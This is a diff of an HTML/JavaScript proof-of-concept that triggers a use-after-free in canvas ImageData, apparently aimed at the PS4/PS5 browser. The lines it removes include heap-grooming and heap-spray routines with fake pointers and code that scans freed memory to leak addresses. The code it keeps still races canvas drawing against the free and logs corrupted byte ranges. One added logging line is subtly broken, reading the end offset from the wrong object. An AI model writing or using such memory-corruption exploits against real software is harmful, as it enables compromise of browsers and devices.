@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Canvas UAF Leak PoC (PS4/PS5?)</title>
+    <title>Canvas UAF PoC (PS4/PS5?)</title>
     <style>
         #trigger {
             margin: 20px 0;
@@ -31,8 +31,8 @@
     </style>
 </head>
 <body>
-    <h1>Canvas UAF Leak PoC</h1>
-    <p>Click to test UAF and leak address. Crash risk minimized.</p>
+    <h1>Canvas UAF PoC</h1>
+    <p>Click to test UAF (0x46 to 0x48).</p>
     <button id="trigger">TEST UAF</button>
     <div id="status">Idle...</div>
     <div id="console"></div>
@@ -43,7 +43,6 @@
         const status = document.getElementById('status');
         const consoleDiv = document.getElementById('console');
         let attemptCount = 0;
-        const imageDataSize = 512 * 512 * 4; // 1MB
 
         function log(msg) {
             consoleDiv.append(msg + '\n');
@@ -72,30 +71,6 @@
             ctx.putImageData(imageData, 0, 0);
         }
 
-        function groomHeap() {
-            const dummy = [];
-            for (let i = 0; i < 100; i++) {
-                dummy.push(new ArrayBuffer(0x1000)); // 4KB dummy buffers
-            }
-            return dummy;
-        }
-
-        function sprayHeap() {
-            const arrays = [];
-            for (let i = 0; i < 200; i++) { // Reduced
-                const buf = new ArrayBuffer(imageDataSize);
-                const view = new DataView(buf);
-                for (let j = 0; j < buf.byteLength; j += 16) {
-                    view.setUint32(j, 0x41424344, true); // ABCD
-                    view.setUint32(j + 4, 0x12345678, true); // Fake ptr low
-                    view.setUint32(j + 8, 0x87654321, true); // Fake ptr high
-                    view.setUint32(j + 12, i, true); // Index
-                }
-                arrays.push(buf);
-            }
-            return arrays;
-        }
-
         function checkImageDataUAF(imageData) {
             const original = new Uint8Array(imageData.data.buffer);
             const originalCopy = new Uint8Array(original);
@@ -103,68 +78,28 @@
             try {
                 const current = new Uint8Array(ctx.getImageData(0, 0, canvas.width, canvas.height).data.buffer);
                 let differenceCount = 0;
-                const ranges = [];
-                let currentRange = null;
+                let startOffset = -1;
+                let endOffset = -1;
+                const newValues = new Set(); // Track unique new values
 
-                // Compare first 4096 bytes
+                // Compare first 4096 bytes, merge into one range
                 for (let i = 0; i < Math.min(original.length, 4096); i++) {
                     try {
                         if (originalCopy[i] !== current[i]) {
                             differenceCount++;
-                            if (!currentRange || currentRange.newValue !== current[i]) {
-                                if (currentRange) {
-                                    ranges.push(currentRange);
-                                }
-                                currentRange = {
-                                    start: i,
-                                    end: i,
-                                    original: originalCopy[i],
-                                    newValue: current[i]
-                                };
-                            } else {
-                                currentRange.end = i;
-                            }
-                        } else if (currentRange) {
-                            ranges.push(currentRange);
-                            currentRange = null;
+                            newValues.add(current[i]);
+                            if (startOffset === -1) startOffset = i;
+                            endOffset = i;
                         }
                     } catch (e) {
-                        return { detected: true, differenceCount, ranges, error: `Access error at offset ${i}: ${e.message}` };
-                    }
-                }
-                if (currentRange) {
-                    ranges.push(currentRange);
-                }
-
-                // Check for sprayed pattern
-                let leak = null;
-                if (differenceCount > 0) {
-                    try {
-                        const currentView = new DataView(current.buffer);
-                        for (let i = 0; i < Math.min(current.buffer.byteLength - 16, 1024); i += 4) {
-                            if (currentView.getUint32(i, true) === 0x41424344) {
-                                const lo = currentView.getUint32(i + 4, true);
-                                const hi = currentView.getUint32(i + 8, true);
-                                const idx = currentView.getUint32(i + 12, true);
-                                if (lo !== 0x12345678 || hi !== 0x87654321) {
-                                    leak = {
-                                        offset: i,
-                                        pattern: 'ABCD',
-                                        ptr: `0x${hi.toString(16).padStart(8, '0')}${lo.toString(16).padStart(8, '0')}`,
-                                        index: idx
-                                    };
-                                    break;
-                                }
-                            }
-                        }
-                    } catch (e) {
-                        return { detected: true, differenceCount, ranges, error: `Leak check error: ${e.message}` };
+                        return { detected: true, differenceCount, range: null, newValues: [], error: `Access error at offset ${i}: ${e.message}` };
                     }
                 }
 
-                return { detected: differenceCount > 0, differenceCount, ranges, leak };
+                const range = (startOffset !== -1 && endOffset !== -1) ? { start: startOffset, end: endOffset } : null;
+                return { detected: differenceCount > 0, differenceCount, range, newValues: [...newValues], error: null };
             } catch (e) {
-                return { detected: true, differenceCount: 0, ranges: [], error: e.message };
+                return { detected: true, differenceCount: 0, range: null, newValues: [], error: e.message };
             }
         }
 
@@ -181,15 +116,7 @@
                     refView[i] = 0x46;
                 }
 
-                // Heap grooming
-                log('Grooming heap with dummy buffers...');
-                const dummy = groomHeap();
-
-                // Spray heap
-                log('Spraying heap with 200 buffers...');
-                const sprayed = sprayHeap();
-
-                // Intensive drawing after spray
+                // Intensive drawing
                 const drawInterval = setInterval(drawOnCanvas, 1);
 
                 // Check for UAF
@@ -206,18 +133,9 @@
                         } else if (result.differenceCount > 0) {
                             status.textContent += `\n${result.differenceCount} bytes changed`;
                             log(`${result.differenceCount} bytes changed`);
-                            if (result.ranges.length > 0) {
-                                log('Changed ranges:');
-                                for (const range of result.ranges) {
-                                    log(`Offsets: ${range.start}-${range.end}, Original: 0x${range.original.toString(16).padStart(2, '0')}, New: 0x${range.newValue.toString(16).padStart(2, '0')}`);
-                                }
-                            }
-                            if (result.leak) {
-                                status.textContent += `\nLeak at offset ${result.leak.offset}!`;
-                                log(`Leak at offset ${result.leak.offset}:`);
-                                log(`Pattern: ${result.leak.pattern}`);
-                                log(`Ptr: ${result.leak.ptr}`);
-                                log(`Buffer index: ${result.leak.index}`);
+                            if (result.range) {
+                                log(`Changed range: Offsets ${result.range.start}-${result.range.end}`);
+                                log(`New values: ${result.newValues.map(v => `0x${v.toString(16).padStart(2, '0')}`).join(', ')}`);
                             }
                         } else {
                             status.textContent += `\nUAF occurred, no bytes checked`;
@@ -236,18 +154,9 @@
                             } else if (secondResult.differenceCount > 0) {
                                 status.textContent += `\n${secondResult.differenceCount} bytes changed`;
                                 log(`${secondResult.differenceCount} bytes changed`);
-                                if (secondResult.ranges.length > 0) {
-                                    log('Changed ranges:');
-                                    for (const range of secondResult.ranges) {
-                                        log(`Offsets: ${range.start}-${range.end}, Original: 0x${range.original.toString(16).padStart(2, '0')}, New: 0x${range.newValue.toString(16).padStart(2, '0')}`);
-                                    }
-                                }
-                                if (secondResult.leak) {
-                                    status.textContent += `\nLeak at offset ${secondResult.leak.offset}!`;
-                                    log(`Leak at offset ${secondResult.leak.offset}:`);
-                                    log(`Pattern: ${secondResult.leak.pattern}`);
-                                    log(`Ptr: ${secondResult.leak.ptr}`);
-                                    log(`Buffer index: ${secondResult.leak.index}`);
+                                if (secondResult.range) {
+                                    log(`Changed range: Offsets ${secondResult.range.start}-${secondResult.end}`);
+                                    log(`New values: ${secondResult.newValues.map(v => `0x${v.toString(16).padStart(2, '0')}`).join(', ')}`);
                                 }
                             } else {
                                 status.textContent += `\nUAF occurred, no bytes checked`;
@@ -258,7 +167,7 @@
                             log('No UAF detected');
                         }
                     }
-                }, 500); // Increased timeout
+                }, 100);
             } catch (err) {
                 status.textContent = `Failed: ${err.message}`;
                 log(`Error: ${err.message}`);
